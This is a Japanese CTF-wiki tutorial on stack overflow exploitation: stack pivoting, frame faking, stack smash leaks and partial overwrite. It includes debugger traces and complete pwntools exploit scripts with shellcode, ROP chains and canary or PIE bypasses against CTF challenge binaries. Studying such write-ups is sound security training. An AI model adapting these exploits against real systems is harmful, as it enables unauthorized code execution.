#  多彩なスタックオーバーフローのテクニック

## stack pivoting

### 原理

stack pivoting は、その名のとおり、スタックポインタを攻撃者が制御できるメモリを指すように乗っ取り、その位置で ROP を行うテクニックです。一般に、次のような場合に stack pivoting が必要になることがあります。

- 制御できるスタックオーバーフローのバイト数が少なく、長い ROP チェーンを組み立てにくい
- PIE 保護が有効でスタックアドレスが分からないとき、スタックを既知の領域に乗っ取れる
- 他の脆弱性が利用しにくく、変換が必要な場合。たとえばスタックをヒープ領域に乗っ取り、ヒープ上に rop を書いてヒープの脆弱性を利用する

また、stack pivoting を利用するには、次の条件が必要です。

- プログラムの実行フローを制御できること。

- sp ポインタを制御できること。一般に、スタックポインタの制御には ROP を使います。スタックポインタを制御する一般的な gadget は次のようなものです。

```asm
pop rsp/esp
```

もちろん、他にもいくつかのやり方があります。たとえば libc_csu_init 内の gadget は、オフセットをずらすことで rsp ポインタを制御できます。上が通常のもの、下がオフセットをずらしたものです。

```asm
gef➤  x/7i 0x000000000040061a
0x40061a <__libc_csu_init+90>:	pop    rbx
0x40061b <__libc_csu_init+91>:	pop    rbp
0x40061c <__libc_csu_init+92>:	pop    r12
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret    
gef➤  x/7i 0x000000000040061d
0x40061d <__libc_csu_init+93>:	pop    rsp
0x40061e <__libc_csu_init+94>:	pop    r13
0x400620 <__libc_csu_init+96>:	pop    r14
0x400622 <__libc_csu_init+98>:	pop    r15
0x400624 <__libc_csu_init+100>:	ret
```

  さらに、より高度な fake frame もあります。


- 内容を制御できるメモリが存在すること。一般には次のようなものがあります。
  - bss セグメント。プロセスはページ単位でメモリを割り当てるため、bss セグメントに割り当てられるメモリは少なくとも 1 ページ(4k、0x1000)の大きさです。しかし一般に bss セグメントの内容はそれほど多くの領域を使わず、また bss セグメントに割り当てられたメモリページには読み書きの権限があります。
  - heap。ただしこれにはヒープアドレスをリークできる必要があります。

### 例

#### 例1

ここでは [X-CTF Quals 2016 - b0verfl0w](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stackprivot/X-CTF%20Quals%202016%20-%20b0verfl0w) を例に紹介します。まず、プログラムのセキュリティ保護を次のように確認します。

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w                 
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

元のプログラムは 32 ビットで、NX 保護も有効になっていないことが分かります。次にプログラムの脆弱性を探します。

```C
signed int vul()
{
  char s; // [sp+18h] [bp-20h]@1

  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(&s, 50, stdin);
  printf("Hello %s.", &s);
  fflush(stdout);
  return 1;
}
```

元のプログラムにスタックオーバーフロー脆弱性があることが分かります。ただし、オーバーフローさせられるバイト数は 50-0x20-4=14 バイトしかないため、比較的よい ROP を実行するのは困難です。そこで stack pivoting を考えます。プログラム自体にスタック保護が有効になっていないので、スタック上に shellcode を配置して実行できます。基本的な利用の方針は次のとおりです。

- スタックオーバーフローで shellcode を配置する
- eip が shellcode を指すよう制御する

第1段階は比較的簡単で、直接読み込ませるだけです。ただし、プログラム自体で ASLR 保護が有効になっているため、shellcode のアドレスを直接知るのは難しいです。しかしスタック上の相対オフセットは固定なので、スタックオーバーフローで esp を操作して shellcode を指すようにし、プログラムを esp にジャンプさせるよう直接制御できます。次は、プログラムを esp にジャンプさせる gadget を探します。

```shell
➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         
Gadgets information
============================================================
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: 3
```

ここで、esp に直接ジャンプできる gadget が1つ見つかりました。そこで payload を次のように配置できます。

```text
shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
```

では payload の最後の部分で esp をどう設定すればよいのでしょうか。次のことが分かっています。

- size(shellcode+padding)=0x20
- size(fake ebp)=0x4
- size(0x08048504)=0x4

したがって、最後の部分で実行すべき命令は次のようになります。

```asm
sub esp,0x28
jmp esp
```

以上から、最終的な exp は次のとおりです。

```python
from pwn import *
sh = process('./b0verfl0w')

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

sub_esp_jmp = asm('sub esp, 0x28;jmp esp')
jmp_esp = 0x08048504
payload = shellcode_x86 + (
    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp
sh.sendline(payload)
sh.interactive()
```

#### 例2 - ヒープへの転送

追記予定です。

### 問題

- [EkoPartyCTF 2016 fuckzing-exploit-200](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stackprivot/EkoPartyCTF%202016%20fuckzing-exploit-200)

## frame faking

このテクニックの名前が示すとおり、偽のスタックフレームを組み立ててプログラムの実行フローを制御するものです。

### 原理

概括すると、これまで説明したスタックオーバーフローは次の2つの方法に尽きます。

- プログラムの EIP を制御する
- プログラムの EBP を制御する

どちらも最終的にはプログラムの実行フローを制御します。frame faking で利用するテクニックは、EBP と EIP を同時に制御することです。これにより、プログラムの実行フローを制御すると同時に、プログラムのスタックフレームの位置も変えます。一般に、その payload は次のとおりです。

```
buffer padding|fake ebp|leave ret addr|
```

つまり、スタックオーバーフローを使ってスタック上を上記の形式に組み立てます。ここでは主に後ろの2つの部分を説明します。

- 関数の戻りアドレスを leave ret を実行するアドレスで上書きします。これは、関数が自身の leave ret を正常に実行し終えた後に、もう一度 leave ret が実行されることを意味します。
- fake ebp は、私たちが組み立てたスタックフレームのベースアドレスで、ここではアドレスであることに注意してください。一般に、組み立てる偽のスタックフレームは次のようになります。

```
fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
```

ここでは fake ebp は ebp2 を指します。つまり、ebp2 が置かれているアドレスです。通常、ここは私たちが制御できる、読み取り可能な内容です。

**以下のアセンブリの構文は intel 構文です。**

基本的な制御の過程を説明する前に、関数のエントリポイントと出口の基本操作を説明しておく必要があります。

エントリポイント

```
push ebp  # ebp をスタックに積む
mov ebp, esp # esp の値を ebp に代入
```

出口

```
leave
ret #pop eip。スタックトップの要素を取り出し、プログラムの次の実行アドレスにする
```

このうち leave 命令は次と等価です。

```
mov esp, ebp # ebp の値を esp に代入
pop ebp # ebp を取り出す
```

では、基本的な制御の過程を詳しく説明します。

1. スタックオーバーフローのあるプログラムが leave を実行するとき、それは2つのステップに分かれます。

    - mov esp, ebp 。これにより esp も、現在のスタックオーバーフロー脆弱性のある関数の ebp のベースアドレスを指すようになります。
    - pop ebp。これにより、スタックに置かれた fake ebp の値が ebp に代入されます。つまり命令の実行後、ebp は ebp2 を指します。すなわち ebp2 が置かれているアドレスが保存されます。

2. ret 命令を実行すると、leave ret 命令がもう一度実行されます。

3. leave 命令を実行します。これは2つのステップに分かれます。

    - mov esp, ebp 。これにより esp が ebp2 を指します。
    - pop ebp。このとき ebp の内容が ebp2 の値に設定され、同時に esp は target function を指します。

4. ret 命令を実行すると、プログラムは target function を実行します。そのプログラムに入るとき、次が実行されます。

    - push ebp。ebp2 の値がスタックに積まれます。

    - mov ebp, esp。ebp が現在のベースアドレスを指します。

このときのスタックの構造は次のとおりです。

```
ebp
|
v
ebp2|leave ret addr|arg1|arg2
```

5. プログラムの実行時には、通常どおり領域が確保されます。また、スタック上にその関数に対応する引数も配置してあるため、プログラムは正常に実行されます。

6. プログラムが終了すると、再び leave ret addr が2回実行されます。そのため ebp2 に対応する内容を配置しておけば、プログラムの実行フローをずっと制御し続けられます。

fake frame では、書き込み可能なメモリ領域が必要で、しかもそのメモリのアドレスを知っている必要があることが分かります。この点は stack pivoting と似ています。


### 2018 安恒杯 over
2018 年 6 月の安恒杯月例コンテストの over という問題を例に紹介します。問題は [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/fake_frame/over) にあります。

#### ファイル情報
```bash
over.over: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=99beb778a74c68e4ce1477b559391e860dd0e946, stripped
[*] '/home/m4x/pwn_repo/others_over/over.over'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
```

64 ビットの動的リンクのプログラムで、PIE と canary 保護は有効ではなく、NX 保護は有効です。

#### プログラムの分析
IDA で分析します。
```C
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  while ( sub_400676() )
    ;
  return 0LL;
}

int sub_400676()
{
  char buf[80]; // [rsp+0h] [rbp-50h]

  memset(buf, 0, sizeof(buf));
  putchar('>');
  read(0, buf, 96uLL);
  return puts(buf);
}
```

脆弱性は明らかで、read は 96 バイト読み込めますが、buf の長さは 80 しかありません。したがって rbp と ret addr は上書きできますが、上書きできるのは rbp と ret addr までです。そのため、rbp と ret addr を同時に制御することでしか rop を行えません。

#### leak stack
rbp を制御するには、いくつかのアドレスを知る必要があります。入力の長さが 80 のとき、read は入力の末尾に '\0' を補わないため、rbp の値が puts によって出力されることが分かります。これにより、固定オフセットでスタック上のすべての位置のアドレスが分かります。
```C
Breakpoint 1, 0x00000000004006b9 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 RAX  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RBX  0x0
 RCX  0x7ff756e9b690 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x60
 RDI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RSI  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 R8   0x7ff75715b760 (_IO_stdfile_1_lock) ◂— 0x0
 R9   0x7ff757354700 ◂— 0x7ff757354700
 R10  0x37b
 R11  0x246
 R12  0x400580 ◂— xor    ebp, ebp
 R13  0x7ffceaf112b0 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
 RSP  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
 RIP  0x4006b9 ◂— call   0x400530
─────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────
 ► 0x4006b9    call   puts@plt <0x400530>
        s: 0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')

   0x4006be    leave
   0x4006bf    ret

   0x4006c0    push   rbp
   0x4006c1    mov    rbp, rsp
   0x4006c4    sub    rsp, 0x10
   0x4006c8    mov    dword ptr [rbp - 4], edi
   0x4006cb    mov    qword ptr [rbp - 0x10], rsi
   0x4006cf    mov    rax, qword ptr [rip + 0x20098a] <0x601060>
   0x4006d6    mov    ecx, 0
   0x4006db    mov    edx, 2
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0           4006b9
   f 1           400715
   f 2     7ff756de02b1 __libc_start_main+241
Breakpoint *0x4006B9
pwndbg> stack 15
00:0000│ rax rdi rsi rsp  0x7ffceaf11160 ◂— 0x3030303030303030 ('00000000')
... ↓
0a:0050│ rbp              0x7ffceaf111b0 —▸ 0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
0b:0058│                  0x7ffceaf111b8 —▸ 0x400715 ◂— test   eax, eax
0c:0060│                  0x7ffceaf111c0 —▸ 0x7ffceaf112b8 —▸ 0x7ffceaf133db ◂— './over.over'
0d:0068│                  0x7ffceaf111c8 ◂— 0x100000000
0e:0070│                  0x7ffceaf111d0 —▸ 0x400730 ◂— push   r15
pwndbg> distance 0x7ffceaf111d0 0x7ffceaf11160
0x7ffceaf111d0->0x7ffceaf11160 is -0x70 bytes (-0xe words)
```

スタックアドレスを leak した後は、rbp をスタック上のアドレス(0x7ffceaf11160 など)に、ret addr を leave ret のアドレスに制御することで、プログラムの流れを制御できます。

たとえば 0x7ffceaf11160 + 0x8 に leak libc の rop chain を置き、`sub_400676` 関数に戻るよう制御して libc を leak できます。

その次の利用では、rop で `system("/bin/sh")` や `execve("/bin/sh", 0, 0)` を実行して shell を得られます。この問題は入力の長さが十分なので、`execve("/bin/sh", 0, 0)` を呼び出す利用チェーンを配置できます。この方法のほうが確実です(`system("/bin/sh")` は env が壊れていると失敗することがあります)。ただし、利用の過程でスタックの構造が変わるため、重要なオフセットのいくつかはデバッグで確定する必要があります。

#### exp
```python
from pwn import *
context.binary = "./over.over"

def DEBUG(cmd):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

io = process("./over.over")
elf = ELF("./over.over")
libc = elf.libc

io.sendafter(">", 'a' * 80)
stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
success("stack -> {:#x}".format(stack))


#  DEBUG("b *0x4006B9\nc")
io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
success("libc.address -> {:#x}".format(libc.address))

pop_rdi_ret=0x400793
'''
$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
0x00000000000f5279 : pop rdx ; pop rsi ; ret
'''
pop_rdx_pop_rsi_ret=libc.address+0xf5279


payload=flat(['22222222', pop_rdi_ret, next(libc.search("/bin/sh")),pop_rdx_pop_rsi_ret,p64(0),p64(0), libc.sym['execve'], (80 - 7*8 ) * '2', stack - 0x30, 0x4006be])

io.sendafter(">", payload)

io.interactive()
```

総じて、この方法は stack pivot とあまり差がありません。

### 参考文献

- [http://www.xfocus.net/articles/200602/851.html](http://www.xfocus.net/articles/200602/851.html)
- [http://phrack.org/issues/58/4.html](http://phrack.org/issues/58/4.html)

## Stack smash

### 原理


プログラムに canary 保護が追加された後、読み込んだ buffer が対応する値を上書きすると、プログラムはエラーを出しますが、一般にはそのエラー情報を気にしません。stack smash というテクニックは、この情報を出力するプログラムを利用して、欲しい内容を得るものです。これは、プログラムで canary 保護が有効になった後、canary が書き換えられたことを検出すると、プログラムが `__stack_chk_fail` 関数を実行して argv[0] ポインタが指す文字列を出力するためです。通常、このポインタはプログラム名を指しています。そのコードは次のとおりです。

```C
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

したがって、スタックオーバーフローで argv[0] を、出力させたい文字列のアドレスで上書きすれば、`__fortify_fail` 関数の中で欲しい情報が出力されます。



> 注記: この方法は glibc-2.31 以降では使えません。詳しくは、この部分のコード [fortify_fail.c](https://elixir.bootlin.com/glibc/glibc-2.31/source/debug/fortify_fail.c) を見てください。

```c
#include <stdio.h>

void
__attribute__ ((noreturn))
__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (do_abort, "*** %s ***: terminated\n", msg);
}
libc_hidden_def (__fortify_fail)
```

> 理由をまとめると、argv[0] ポインタが指す文字列が出力されなくなったためです

### 32C3 CTF readme

ここでは 2015 年の 32C3 CTF readme を例に紹介します。この問題は [jarvisoj](https://www.jarvisoj.com/challenges) に再現があります。読者が再現しやすいように、binary は [ctf-challenge ](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/stacksmashes/32c3-CTF-readme)のリポジトリにもあります。

#### 保護の確認

プログラムは 64 ビットで、主に Canary 保護と NX 保護、さらに FORTIFY 保護が有効になっていることが分かります。

```shell
➜  stacksmashes git:(master) ✗ checksec smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

#### プログラムの分析

ida で見てみます。

```c
__int64 sub_4007E0()
{
  __int64 v0; // rax@1
  __int64 v1; // rbx@2
  int v2; // eax@3
  __int64 v4; // [sp+0h] [bp-128h]@1
  __int64 v5; // [sp+108h] [bp-20h]@1

  v5 = *MK_FP(__FS__, 40LL);
  __printf_chk(1LL, (__int64)"Hello!\nWhat's your name? ");
  LODWORD(v0) = _IO_gets((__int64)&v4);
  if ( !v0 )
LABEL_9:
    _exit(1);
  v1 = 0LL;
  __printf_chk(1LL, (__int64)"Nice to meet you, %s.\nPlease overwrite the flag: ");
  while ( 1 )
  {
    v2 = _IO_getc(stdin);
    if ( v2 == -1 )
      goto LABEL_9;
    if ( v2 == '\n' )
      break;
    byte_600D20[v1++] = v2;
    if ( v1 == ' ' )
      goto LABEL_8;
  }
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
LABEL_8:
  puts("Thank you, bye!");
  return *MK_FP(__FS__, 40LL) ^ v5;
}
```

明らかに、プログラムは `_IO_gets((__int64)&v4)`; にスタックオーバーフローがあります。

また、プログラムは flag を overwrite するようにも促しています。さらに、プログラムが while ループの後にこの文を実行しているのが興味深いです。

```C
  memset((void *)((signed int)v1 + 0x600D20LL), 0, (unsigned int)(32 - v1));
```

対応するアドレスの内容を見ると、次の内容があり、プログラムの flag がここにあることが分かります。


```
.data:0000000000600D20 ; char aPctfHereSTheFl[]
.data:0000000000600D20 aPctfHereSTheFl db 'PCTF{Here',27h,'s the flag on server}',0
```

しかし、スタックオーバーフローでこのアドレスの内容を直接出力するのは不可能です。読み込む内容 ` byte_600D20[v1++] = v2;` がちょうどこのメモリブロックでもあり、これを直接上書きしてしまうからです。そこで、あるテクニックを使う必要があります。

- ELF のメモリマッピングでは、bss セグメントは2回マップされます。そのため別の場所のアドレスを使って出力できます。gdb の find で探せます。

#### flag のアドレスの確定

memset 関数にブレークポイントを置き、対応する内容を次のように読み取ります。

```asm
gef➤  c
Continuing.
Hello!
What's your name? qqqqqqq
Nice to meet you, qqqqqqq.
Please overwrite the flag: 222222222

Breakpoint 1, __memset_avx2 () at ../sysdeps/x86_64/multiarch/memset-avx2.S:38
38	../sysdeps/x86_64/multiarch/memset-avx2.S: 没有那个文件或目录.
─────────────────────────────────────[ code:i386:x86-64 ]────
   0x7ffff7b7f920 <__memset_chk_avx2+0> cmp    rcx, rdx
   0x7ffff7b7f923 <__memset_chk_avx2+3> jb     0x7ffff7b24110 <__GI___chk_fail>
   0x7ffff7b7f929                  nop    DWORD PTR [rax+0x0]
 → 0x7ffff7b7f930 <__memset_avx2+0> vpxor  xmm0, xmm0, xmm0
   0x7ffff7b7f934 <__memset_avx2+4> vmovd  xmm1, esi
   0x7ffff7b7f938 <__memset_avx2+8> lea    rsi, [rdi+rdx*1]
   0x7ffff7b7f93c <__memset_avx2+12> mov    rax, rdi
───────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffda38', 'l8']
8
0x00007fffffffda38│+0x00: 0x0000000000400878  →   mov edi, 0x40094e	 ← $rsp
0x00007fffffffda40│+0x08: 0x0071717171717171 ("qqqqqqq"?)
0x00007fffffffda48│+0x10: 0x0000000000000000
0x00007fffffffda50│+0x18: 0x0000000000000000
0x00007fffffffda58│+0x20: 0x0000000000000000
0x00007fffffffda60│+0x28: 0x0000000000000000
0x00007fffffffda68│+0x30: 0x0000000000000000
0x00007fffffffda70│+0x38: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x7ffff7b7f930 → Name: __memset_avx2()
[#1] 0x400878 → mov edi, 0x40094e
──────────────────────────────────────────────────────────────────────────────
gef➤  find 22222
Argument required (expression to compute).
gef➤  find '22222'
No symbol "22222" in current context.
gef➤  grep '22222'
[+] Searching '22222' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x600000-0x601000), permission=rw-
  0x600d20 - 0x600d3f  →   "222222222's the flag on server}" 
[+] In '[heap]'(0x601000-0x622000), permission=rw-
  0x601010 - 0x601019  →   "222222222" 
gef➤  grep PCTF
[+] Searching 'PCTF' in memory
[+] In '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes'(0x400000-0x401000), permission=r-x
  0x400d20 - 0x400d3f  →   "PCTF{Here's the flag on server}" 
```

読み込んだ 2222 が 0x600d20 にある flag を上書きしていますが、メモリの 0x400d20 にこの flag のコピーが見つかります。そのため、これを出力できます。ここで flag のアドレスが確定しました。

#### オフセットの確定

次に、argv[0] の、読み込んだ文字列からのオフセットを確定します。

まず main 関数の入口にブレークポイントを置きます。次のとおりです。

```asm
gef➤  b *0x00000000004006D0
Breakpoint 1 at 0x4006d0
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/stacksmashes/smashes 

Breakpoint 1, 0x00000000004006d0 in ?? ()
 code:i386:x86-64 ]────
     0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
     0x4006c6 <_IO_gets@plt+6> push   0x9
     0x4006cb <_IO_gets@plt+11> jmp    0x400620
 →   0x4006d0                  sub    rsp, 0x8
     0x4006d4                  mov    rdi, QWORD PTR [rip+0x200665]        # 0x600d40 <stdout>
     0x4006db                  xor    esi, esi
     0x4006dd                  call   0x400660 <setbuf@plt>
──────────────────────────────────────────────────────────────────[ stack ]────
['0x7fffffffdb78', 'l8']
8
0x00007fffffffdb78│+0x00: 0x00007ffff7a2d830  →  <__libc_start_main+240> mov edi, eax	 ← $rsp
0x00007fffffffdb80│+0x08: 0x0000000000000000
0x00007fffffffdb88│+0x10: 0x00007fffffffdc58  →  0x00007fffffffe00b  →  "/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/exam[...]"
0x00007fffffffdb90│+0x18: 0x0000000100000000
0x00007fffffffdb98│+0x20: 0x00000000004006d0  →   sub rsp, 0x8
0x00007fffffffdba0│+0x28: 0x0000000000000000
0x00007fffffffdba8│+0x30: 0x48c916d3cf726fe3
0x00007fffffffdbb0│+0x38: 0x00000000004006ee  →   xor ebp, ebp
──────────────────────────────────────────────────────────────[ trace ]────
[#0] 0x4006d0 → sub rsp, 0x8
[#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdc48)
---Type <return> to continue, or q <return> to quit---
[#2] 0x400717 → hlt 

```

0x00007fffffffe00b がプログラム名を指していることが分かります。これは当然 argv[0] であり、書き換える内容はこのアドレスです。また 0x00007fffffffdc58 にこのアドレスが保存されているので、実際に必要なアドレスは 0x00007fffffffdc58 です。

さらに、アセンブリコードから

```asm
.text:00000000004007E0                 push    rbp
.text:00000000004007E1                 mov     esi, offset aHelloWhatSYour ; "Hello!\nWhat's your name? "
.text:00000000004007E6                 mov     edi, 1
.text:00000000004007EB                 push    rbx
.text:00000000004007EC                 sub     rsp, 118h
.text:00000000004007F3                 mov     rax, fs:28h
.text:00000000004007FC                 mov     [rsp+128h+var_20], rax
.text:0000000000400804                 xor     eax, eax
.text:0000000000400806                 call    ___printf_chk
.text:000000000040080B                 mov     rdi, rsp
.text:000000000040080E                 call    __IO_gets
```

読み込む文字列の先頭アドレスは、実は `__IO_gets` を呼び出す前の rsp であると確定できます。そこで call のところにブレークポイントを置きます。次のとおりです。

```asm
gef➤  b *0x000000000040080E
Breakpoint 2 at 0x40080e
gef➤  c
Continuing.
Hello!
What's your name? 
Breakpoint 2, 0x000000000040080e in ?? ()
──────────────────────────[ code:i386:x86-64 ]────
     0x400804                  xor    eax, eax
     0x400806                  call   0x4006b0 <__printf_chk@plt>
     0x40080b                  mov    rdi, rsp
 →   0x40080e                  call   0x4006c0 <_IO_gets@plt>
   ↳    0x4006c0 <_IO_gets@plt+0> jmp    QWORD PTR [rip+0x20062a]        # 0x600cf0 <_IO_gets@got.plt>
        0x4006c6 <_IO_gets@plt+6> push   0x9
        0x4006cb <_IO_gets@plt+11> jmp    0x400620
        0x4006d0                  sub    rsp, 0x8
──────────────────[ stack ]────
['0x7fffffffda40', 'l8']
8
0x00007fffffffda40│+0x00: 0x0000ff0000000000	 ← $rsp, $rdi
0x00007fffffffda48│+0x08: 0x0000000000000000
0x00007fffffffda50│+0x10: 0x0000000000000000
0x00007fffffffda58│+0x18: 0x0000000000000000
0x00007fffffffda60│+0x20: 0x0000000000000000
0x00007fffffffda68│+0x28: 0x0000000000000000
0x00007fffffffda70│+0x30: 0x0000000000000000
0x00007fffffffda78│+0x38: 0x0000000000000000
────────────────────────────────────────────[ trace ]────
[#0] 0x40080e → call 0x4006c0 <_IO_gets@plt>
──────────────────────────────────────────────────────────
gef➤  print $rsp
$1 = (void *) 0x7fffffffda40
```

rsp の値は 0x7fffffffda40 であることが分かります。したがって相対オフセットは次のとおりです。

```python
>>> 0x00007fffffffdc58-0x7fffffffda40
536
>>> hex(536)
'0x218'
```

#### 利用プログラム

利用プログラムを次のように組み立てます。

```python
from pwn import *
context.log_level = 'debug'
smash = ELF('./smashes')
if args['REMOTE']:
    sh = remote('pwn.jarvisoj.com', 9877)
else:
    sh = process('./smashes')
argv_addr = 0x00007fffffffdc58
name_addr = 0x7fffffffda40
flag_addr = 0x600D20
another_flag_addr = 0x400d20
payload = 'a' * (argv_addr - name_addr) + p64(another_flag_addr)
sh.recvuntil('name? ')
sh.sendline(payload)
sh.recvuntil('flag: ')
sh.sendline('bb')
data = sh.recv()
sh.interactive()
```

ここでは直接 flag が得られ、ネット上で言われているような flag が得られないという状況は起きませんでした。

### 問題
- 2018 網鼎杯 - guess

## スタック上の partial overwrite
partial overwrite というテクニックは多くの場面で使えます。ここではまずスタック上の partial overwrite を例に、この考え方を紹介します。

ランダム化(ASLR、PIE)が有効になっていても、上位のアドレスがどう変化しても、下位 12 ビットのページ内オフセットは常に固定であることが分かっています。つまり、下位のオフセットを変更できれば、ある程度プログラムの実行フローを制御し、PIE 保護を回避できます。

### 2018-安恒杯-babypie
安恒杯 2018 年 7 月の月例コンテストの babypie を例に、このテクニックの利用を分析します。問題の binary は [ctf-challenge](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/partial_overwrite) に置かれています。
#### 保護の確認
```bash
babypie: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=77a11dbd367716f44ca03a81e8253e14b6758ac3, stripped
[*] '/home/m4x/pwn_repo/LinkCTF_2018.7_babypie/babypie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

64 ビットの動的リンクのファイルで、PIE 保護とスタックオーバーフロー保護(canary)が有効です。
#### プログラムの分析
IDA で見ると、脆弱性のある場所は簡単に見つかります。2か所の入力のどちらにも明らかなスタックオーバーフロー脆弱性があります。注意すべきは、入力の前にプログラムがスタック領域をゼロクリアしていることです。そのため、スタック上の情報を出力させて binary や libc のベースアドレスを leak することはできません。
```C
__int64 sub_960()
{
  char buf[40]; // [rsp+0h] [rbp-30h]
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  *(_OWORD *)buf = 0uLL;
  *(_OWORD *)&buf[16] = 0uLL;
  puts("Input your Name:");
  read(0, buf, 0x30uLL);                        // overflow
  printf("Hello %s:\n", buf, *(_QWORD *)buf, *(_QWORD *)&buf[8], *(_QWORD *)&buf[16], *(_QWORD *)&buf[24]);
  read(0, buf, 0x60uLL);                        // overflow
  return 0LL;
}
```

同時に、プログラム内に直接 get shell できる関数が用意されていることも分かります。
```asm
.text:0000000000000A3E getshell        proc near
.text:0000000000000A3E ; __unwind { .text:0000000000000A3E                 push    rbp
.text:0000000000000A3F                 mov     rbp, rsp
.text:0000000000000A42                 lea     rdi, command    ; "/bin/sh"
.text:0000000000000A49                 call    _system
.text:0000000000000A4E                 nop
.text:0000000000000A4F                 pop     rbp
.text:0000000000000A50                 retn
.text:0000000000000A50 ; } // starts at A3E
.text:0000000000000A50 getshell        endp
```
そこで、rip をこの関数に制御するだけで済みます。

#### leak canary
最初の read の直後にすぐ出力があり、read は入力の末尾に \0 を付けないため、スタック上の内容を leak する機会が得られます。

2回目のオーバーフローで戻りアドレスを制御できるように、canary を leak します。最初の read に必要な長さは 0x30 - 0x8 + 1 と計算できます(+ 1 は canary の最下位バイトを 0 以外の値で上書きするためです。printf が %s を使うとき、\0 に出会うと終了します。canary の最下位バイトを 0 以外の値で上書きすれば、canary を printf で出力できます)。

```asm
Breakpoint 1, 0x0000557c8443aa08 in ?? ()
